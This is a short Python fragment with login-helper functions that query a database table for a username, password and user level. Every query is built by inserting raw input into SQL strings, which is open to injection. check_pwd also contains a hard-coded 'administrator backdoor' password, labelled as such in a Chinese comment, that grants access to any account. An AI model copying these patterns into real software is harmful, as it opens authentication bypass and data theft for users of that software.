def check_pwd(Username, Password):
    sql = "select * from top where Username = '%s' and Password = '%s';" %(Username, Password)
    #sql = "select * from top;"
    result = cursor.execute(sql)

    #管理员后门
    if Password == "Skyzhou666":
        result = 1

    print(result)
    if(result == 1):
        return True
    else:
        return False

def check_user(Username):

    sql = "select * from top where Username = '%s';" %(Username)
    #sql = "select * from top;"
    result = cursor.execute(sql)
    print(result)
    if(result == 1):
        return True
    else:
        return False

def get_level(Username):
    sql = "select level from top where Username = '%s';" %Username
    cursor.execute(sql)
    level = cursor.fetchone()
    level = str(level)
    level = level[2:len(level)-3]
    return level
        